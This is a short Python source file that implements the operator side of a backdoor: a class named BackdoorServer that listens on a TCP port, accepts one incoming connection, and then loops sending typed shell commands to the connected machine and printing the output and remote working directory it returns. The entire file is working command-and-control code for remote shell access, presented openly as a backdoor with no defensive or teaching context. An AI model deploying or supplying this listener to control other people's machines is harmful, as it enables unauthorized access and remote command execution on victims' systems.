import socket

class BackdoorServer:
    def __init__(self, host, port, buffer_size=2024, sep="<sep>"):
        self.host = host
        self.port = port
        self.buffer_size = buffer_size
        self.sep = sep
        self.server_sock = None
        self.conn = None
        self.addr = None

    def start(self):
        self.setup_server()
        self.accept_connection()
        self.backdoor_communication()

    def setup_server(self):
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind((self.host, self.port))
        self.server_sock.listen(1)
        print(f"[*] Listening for incoming connections on {self.host}:{self.port}")

    def accept_connection(self):
        print("[*] Waiting for a connection...")
        self.conn, self.addr = self.server_sock.accept()
        print(f"[*] Connection established with {self.addr}")

    def backdoor_communication(self):
        cwd = self.receive_data().decode()
        while True:
            command = input(f"[SHELL] {cwd}$> ").strip()
            self.send_data(command.encode())
            results, cwd = self.receive_data().decode().split(self.sep)
            print(results)

    def send_data(self, data):
        self.conn.send(data)

    def receive_data(self):
        return self.conn.recv(self.buffer_size)

    def stop(self):
        if self.conn:
            self.conn.close()
        if self.server_sock:
            self.server_sock.close()
        print("[*] Server stopped")

def main():
    host = "127.0.0.1"
    port = 9999
    backdoor_server = BackdoorServer(host, port)
    try:
        backdoor_server.start()
    except KeyboardInterrupt:
        backdoor_server.stop()

if __name__ == "__main__":
    main()
